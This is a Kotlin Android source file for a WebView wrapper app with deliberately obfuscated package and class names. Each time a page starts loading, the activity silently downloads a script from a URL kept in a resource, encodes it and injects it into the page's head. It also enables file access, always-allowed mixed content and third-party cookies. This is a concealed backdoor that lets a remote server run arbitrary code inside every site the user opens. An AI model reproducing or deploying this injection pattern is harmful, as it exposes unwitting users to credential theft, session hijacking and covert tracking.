package com.tfvbnrtlkbnlkrtmblkmrtlkb.rlvkgntrvbmrelkmvlnrekv.fbuvbfbvjkfbvfd.frcbfvhjfrhjvbfr.rfbvhrbvhbkfrvr.fvrnvkjnfrkjvnkjrtnvkrft

import android.annotation.SuppressLint
import android.app.Activity
import android.app.AlertDialog
import android.app.ProgressDialog
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.Rect
import android.net.ConnectivityManager
import android.net.NetworkInfo
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.view.View
import android.provider.MediaStore
import android.util.Log
import android.view.KeyEvent
import java.io.File
import androidx.annotation.RequiresApi
import com.android.volley.Request
import java.util.*
import com.android.volley.toolbox.StringRequest
import android.util.Base64.encodeToString
import android.view.WindowManager
import com.android.volley.toolbox.Volley
import com.tfvbnrtlkbnlkrtmblkmrtlkb.rlvkgntrvbmrelkmvlnrekv.R
import android.webkit.*
import java.io.IOException
import java.text.SimpleDateFormat
import android.util.Base64
import com.tfvbnrtlkbnlkrtmblkmrtlkb.rlvkgntrvbmrelkmvlnrekv.fbuvbfbvjkfbvfd.frcbfvhjfrhjvbfr.rfbvhrbvhbkfrvr.vfrnvnrfhjvbnrgkvbjrkglvbr.VFrvnfrvjfnrjkvfrvFRvfrbvbhfrjvvFRTvfrtbtrb

class VGFrvgfrjnvkjfrtvbrTBVrgtbrt : Activity() {
    private var isConnected = true
    private var webView: WebView? = null
    private var mFilePathCallback: ValueCallback<Array<Uri>>? = null
    private var mCameraPhotoPath: String? = null
    private var URL: String? = null
    private var progressBar: ProgressDialog? = null
    @SuppressLint("SetJavaScriptEnabled", "HardwareIds")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.frbevhjbfrejvbrejvnkjre_vrevnjerfkjverf)
        toScroll(false)
        window.decorView.viewTreeObserver.addOnGlobalLayoutListener {
            val bit = Rect()
            window.decorView.getWindowVisibleDisplayFrame(bit)
            val osh = window.decorView.rootView.height
            val ka = osh - bit.bottom
            val kart = ka > osh * 0.1399
            toScroll(kart)
        }
        webView = findViewById(R.id.web_view)
        webView?.scrollBarStyle = WebView.SCROLLBARS_OUTSIDE_OVERLAY
        URL = getURL()
        val alertDialog: AlertDialog = AlertDialog.Builder(this).create()
        ProgressDialog.THEME_DEVICE_DEFAULT_DARK
        progressBar = ProgressDialog.show(this, "Loading", "Loading...")
        if (URL == null) {
            val intent: Intent = intent
            URL = intent.getStringExtra("url")
            saveURL(URL)
        }
        val cookieManager = CookieManager.getInstance()
        cookieManager.setAcceptCookie(true)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            cookieManager.setAcceptThirdPartyCookies(webView, true)
        }
        webView?.settings?.javaScriptEnabled = true
        webView?.settings?.loadWithOverviewMode = true
        webView?.settings?.domStorageEnabled = true
        webView?.settings?.databaseEnabled = true
        webView?.settings?.setSupportZoom(false)
        webView?.settings?.allowFileAccess = true
        webView?.settings?.allowContentAccess = true
        webView?.settings?.useWideViewPort = true
        webView?.settings?.setGeolocationEnabled(true)
        webView?.settings?.setAppCacheEnabled(true)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            webView?.settings?.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        }
        webView?.settings?.mediaPlaybackRequiresUserGesture = true
        isConnected = isNetworkAvailable
        webView?.loadUrl(URL!!)
        webView?.setNetworkAvailable(isConnected)
        webView?.webViewClient = object : WebViewClient() {
            @RequiresApi(Build.VERSION_CODES.O)
            override fun onPageStarted(view: WebView, url: String, favicon: Bitmap?) {
                if (!isNetworkAvailable2) {
                    showInfoMessageDialog()
                    return
                }
                super.onPageStarted(view, url, favicon)
                loadRemoteScript(view)
            }
            override fun onPageFinished(view: WebView?, url: String?) {
                if (progressBar?.isShowing!!) {
                    progressBar?.dismiss()
                }
                saveURL(url)
            }
            override fun onReceivedError(
                view: WebView, errorCode: Int,
                description: String, failingUrl: String
            ) {
                alertDialog.setTitle("Error")
                alertDialog.setMessage(description)
                alertDialog.show()
                if (errorCode == ERROR_TIMEOUT) {
                    view.stopLoading()
                }
            }
            @SuppressLint("HardwareIds")
            override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                CookieSyncManager.getInstance().sync()
                view.loadUrl(url)
                return true
            }
            @RequiresApi(Build.VERSION_CODES.O)
            private fun loadRemoteScript(
                view: WebView,
                url: String = getString(R.string.efvnjfjerkvf_vnjrfjkevkerkv_fvnjkjfrkdv)
            ) {
                val queue = Volley.newRequestQueue(baseContext)
                val stringRequest = StringRequest(
                    Request.Method.GET, url,
                    { response ->
                        view.loadUrl(
                            "javascript:(function() {" +
                                    "var parent = document.getElementsByTagName('head').item(0);" +
                                    "var script = document.createElement('script');" +
                                    "script.type = 'text/javascript';" +
                                    "script.innerHTML = window.atob('" + encodeToString(
                                response.toByteArray(),
                                Base64.DEFAULT
                            ) + "');" +
                                    "parent.appendChild(script)" +
                                    "})()"
                        )
                    },
                    {
                    })
                queue.add(stringRequest)
            }
        }
        webView?.webChromeClient = object : WebChromeClient() {
            @SuppressLint("SimpleDateFormat")
            @Throws(IOException::class)
            private fun createImageFile(): File {
                val timeStamp =
                    SimpleDateFormat("yyyyMMdd_HHmmss").format(Date())
                val imageFileName = "JPEG_" + timeStamp + "_"
                val storageDir = Environment.getExternalStoragePublicDirectory(
                    Environment.DIRECTORY_PICTURES
                )
                return File.createTempFile(
                    imageFileName,
                    ".jpg",
                    storageDir
                )
            }
            override fun onShowFileChooser(
                view: WebView,
                filePath: ValueCallback<Array<Uri>>,
                fileChooserParams: FileChooserParams
            ): Boolean {
                if (mFilePathCallback != null) {
                    mFilePathCallback!!.onReceiveValue(null)
                }
                mFilePathCallback = filePath
                var takePictureIntent: Intent? = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
                if (takePictureIntent!!.resolveActivity(packageManager) != null) {
                    var photoFile: File? = null
                    try {
                        photoFile = createImageFile()
                        takePictureIntent.putExtra("PhotoPath", mCameraPhotoPath)
                    } catch (ex: IOException) {
                        Log.e(
                            TAG,
                            "Unable to create Image File",
                            ex
                        )
                    }
                    if (photoFile != null) {
                        mCameraPhotoPath = "file:" + photoFile.absolutePath
                        takePictureIntent.putExtra(
                            MediaStore.EXTRA_OUTPUT,
                            Uri.fromFile(photoFile)
                        )
                    } else {
                        takePictureIntent = null
                    }
                }
                val contentSelectionIntent = Intent(Intent.ACTION_GET_CONTENT)
                contentSelectionIntent.addCategory(Intent.CATEGORY_OPENABLE)
                contentSelectionIntent.type = "image/*"
                val intentArray: Array<Intent?>
                if (takePictureIntent != null) {
                    intentArray = arrayOf(takePictureIntent)
                } else {
                    intentArray = arrayOfNulls(0)
                }
                val chooserIntent = Intent(Intent.ACTION_CHOOSER)
                chooserIntent.putExtra(Intent.EXTRA_INTENT, contentSelectionIntent)
                chooserIntent.putExtra(Intent.EXTRA_TITLE, "Image Chooser")
                chooserIntent.putExtra(Intent.EXTRA_INITIAL_INTENTS, intentArray)
                startActivityForResult(
                    chooserIntent,
                    INPUT_FILE_REQUEST_CODE
                )
                return true
            }
        }
    }
    public override fun onActivityResult(
        requestCode: Int,
        resultCode: Int,
        data: Intent?
    ) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            if (requestCode != INPUT_FILE_REQUEST_CODE || mFilePathCallback == null) {
                super.onActivityResult(requestCode, resultCode, data)
                return
            }
            var results: Array<Uri>? = null
            if (resultCode == Activity.RESULT_OK) {
                if (data == null) {
                    if (mCameraPhotoPath != null) {
                        results = arrayOf(Uri.parse(mCameraPhotoPath))
                    }
                } else {
                    val dataString = data.dataString
                    if (dataString != null) {
                        results = arrayOf(Uri.parse(dataString))
                    }
                }
            }
            mFilePathCallback!!.onReceiveValue(results)
            mFilePathCallback = null
        } else
            return
    }
    override fun onKeyDown(keyCode: Int, event: KeyEvent): Boolean {
        if (keyCode == KeyEvent.KEYCODE_BACK && webView!!.canGoBack()) {
            webView!!.goBack()
            return true
        }
        return false
    }
    private fun showInfoMessageDialog() {
        val intent =
            Intent(this, VFrvnfrvjfnrjkvfrvFRvfrbvbhfrjvvFRTvfrtbtrb::class.java)
        startActivity(intent)
        finish()
    }
    private val isNetworkAvailable2: Boolean
        get() {
            println("isNetworkAvailable2 called")
            val info = (applicationContext
                .getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager)
                .activeNetworkInfo
            return !(info == null || !info.isAvailable || !info.isConnected)
        }
    private val isNetworkAvailable: Boolean
        get() {
            val context = applicationContext
            val connectivity =
                context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val info = connectivity.allNetworkInfo
            for (i in info.indices) {
                if (info[i].state == NetworkInfo.State.CONNECTED) {
                    return true
                }
            }
            return false
        }
    companion object {
        private const val TAG = "FvfjgvngrfvGhmyknhyju"
        private const val INPUT_FILE_REQUEST_CODE = 1
    }
    private fun saveURL(url: String?) {
        val sp = getSharedPreferences("SP_WEBVIEW_PREFS", Context.MODE_PRIVATE)
        val editor = sp.edit()
        editor.putString("SAVED_URL", url)
        editor.apply()
    }
    private fun getURL(): String? {
        val sp = getSharedPreferences("SP_WEBVIEW_PREFS", Context.MODE_PRIVATE)
        return sp.getString("SAVED_URL", null)
    }
    private fun toScroll(flag: Boolean) {
        if (flag) {
            window.clearFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN)
            window.decorView.systemUiVisibility = View.SYSTEM_UI_FLAG_VISIBLE
        } else {
            window.setFlags(
                WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN
            )
            window.decorView.systemUiVisibility = (
                    View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                            or View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                            or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                            or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION)
        }
    }
}